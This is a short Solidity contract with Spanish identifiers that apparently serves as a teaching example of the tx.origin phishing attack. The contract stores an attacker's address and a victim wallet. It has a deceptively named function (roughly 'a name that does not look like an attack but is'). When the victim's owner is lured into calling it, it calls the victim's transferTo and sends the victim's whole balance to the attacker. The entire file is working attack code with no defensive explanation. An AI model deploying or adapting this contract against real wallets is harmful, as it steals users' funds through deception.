pragma solidity ^0.6.0;

interface TxUserWallet {
    function transferTo(address payable dest, uint amount) external;
}

contract TxAttackWallet {
    address payable public ownerAtacante;
    address SCAtacar;

    constructor(address _SCAAtacar) public {
        ownerAtacante = msg.sender;
        SCAtacar = _SCAAtacar;
    }

    function nombreQueNoPareceUnAtaquePeroLoEs() external payable {
        TxUserWallet(SCAtacar).transferTo(ownerAtacante, SCAtacar.balance);
    }
}